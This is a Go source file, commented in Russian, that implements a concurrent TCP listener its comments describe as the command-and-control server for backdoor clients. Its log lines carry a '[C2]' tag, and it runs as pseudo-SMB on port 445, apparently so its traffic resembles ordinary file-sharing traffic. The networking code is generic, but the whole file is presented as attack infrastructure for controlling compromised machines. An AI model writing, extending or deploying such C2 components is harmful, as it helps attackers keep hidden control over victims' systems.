// Package tcpserver реализует TCP-сервер для клиентов-бэкдоров
// (псевдо-SMB поверх TCP на порту 445).
package tcpserver

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net"
	"sync"
)

// ConnHandler обрабатывает одно TCP-соединение.
type ConnHandler interface {
	HandleConn(ctx context.Context, conn net.Conn) error
}

// Server — TCP-сервер для клиентов-бэкдоров.
// Управляет жизненным циклом горутин через WaitGroup и context.
type Server struct {
	addr    string
	handler ConnHandler
	wg      sync.WaitGroup
}

// NewServer создаёт TCP-сервер.
func NewServer(addr string, h ConnHandler) *Server {
	return &Server{addr: addr, handler: h}
}

// Run запускает сервер и блокируется до отмены контекста.
// При отмене корректно закрывает listener и ждёт завершения всех горутин.
func (s *Server) Run(ctx context.Context) error {
	lc := net.ListenConfig{}
	listener, err := lc.Listen(ctx, "tcp", s.addr)
	if err != nil {
		return fmt.Errorf("listen %s: %w", s.addr, err)
	}
	log.Printf("[C2] TCP-сервер запущен на %s", s.addr)

	go func() {
		<-ctx.Done()
		if err := listener.Close(); err != nil && !errors.Is(err, net.ErrClosed) {
			log.Printf("[C2] ошибка закрытия listener: %v", err)
		}
	}()

	for {
		conn, err := listener.Accept()
		if err != nil {
			if errors.Is(err, net.ErrClosed) {
				s.wg.Wait()
				return nil
			}
			log.Printf("[C2] accept error: %v", err)
			continue
		}
		s.wg.Add(1)
		go func(c net.Conn) {
			defer s.wg.Done()
			// Защита от паники в обработчике: одна упавшая горутина
			// не должна ронять весь C2-сервер.
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[C2] panic in conn %s: %v", c.RemoteAddr(), r)
				}
			}()
			if err := s.handler.HandleConn(ctx, c); err != nil {
				log.Printf("[C2] conn %s: %v", c.RemoteAddr(), err)
			}
		}(conn)
	}
}